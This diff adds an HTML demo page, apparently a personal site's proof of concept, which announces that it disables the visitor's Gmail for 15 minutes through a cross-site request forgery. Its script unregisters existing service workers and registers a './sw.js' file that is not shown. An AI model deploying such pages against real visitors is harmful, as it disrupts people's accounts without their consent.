@@ -1,0 +1,57 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Roboto" rel="stylesheet">
+        <link href = "../style.css" rel = "stylesheet">
+        <title>CSRF Demo | talpa.cc</title>
+        <meta property = "og:title" content = "CSRF Demo | talpa.cc" />
+        <meta property = "og:description" content = "Demonstration of a Cross-Site Request Forgery (CSRF) involving the goog" />
+        <meta property = "og:image" content = "https://c.tenor.com/6EK1EGptUtkAAAAC/monty-mole-gaming.gif" />
+        <link rel="icon" href="https://c.tenor.com/6EK1EGptUtkAAAAC/monty-mole-gaming.gif">
+    </head>
+<body>
+    <div class = "divider"></div>
+    <div class = "main">
+        <span>
+            <br />
+            <h1>Talpa's CSRF Demo</h1><br />
+            <span id="e">Gmail will not work for the next 15 minutes. This is due to a Cross-Site Request Forgery (CSRF) exploit and service workers.</span><br />
+        </span>
+        <br />
+        <br />
+        <br />
+        <p>
+            <a href = "../" class = "white" style = "color:white;">
+                Home
+            </a>
+        </p>
+	</div>
+    <script>
+        if ('serviceWorker' in navigator) {
+           
+           navigator.serviceWorker.getRegistrations().then((registrations) => {
+              let promises = [];
+              for (let i = 0; i < registrations.length; i++) {
+                  promises.push(registrations[i].unregister());
+              }
+              Promise.all(promises).then(() => {
+                  navigator.serviceWorker.register('./sw.js', {scope: './'})
+                   .then((reg) => {
+                     // registration worked
+                     console.log('Registration succeeded. Scope is ' + reg.scope);
+                   }).catch((error) => {
+                     // registration failed
+                     console.log('Registration failed with ' + error);
+                   });
+              }).catch((err) => {
+
+           })})
+        }
+    </script>
+
+<footer>Test</footer>
+</body>
+</html>
